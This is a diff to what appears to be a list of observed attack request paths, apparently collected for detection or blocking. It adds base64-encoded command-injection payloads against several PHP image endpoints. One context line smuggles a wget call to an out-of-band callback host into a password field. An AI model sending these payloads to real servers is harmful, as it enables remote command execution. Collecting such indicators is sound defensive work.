@@ -23896,3 +23896,7 @@ ipv4-internet.yandex.net:443
 http://141.76.94.18:80/pscan
 p-scanner.research.netd.cs.tu-dresden.de:443
 /Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://d0m448i93sf15f65rb5gg41zpobn3xgpp.oast.live)
+/objects/kkfhd.txt
+/objects/getImageMP4.php?base64Url=YGlkID4ga2tmaGQudHh0YA===&format=jpg
+/objects/getSpiritsFromVideo.php?base64Url=YGlkID4ga2tmaGQudHh0YA===&format=jpg
+/objects/getImage.php?base64Url=YGlkID4ga2tmaGQudHh0YA===&format=png
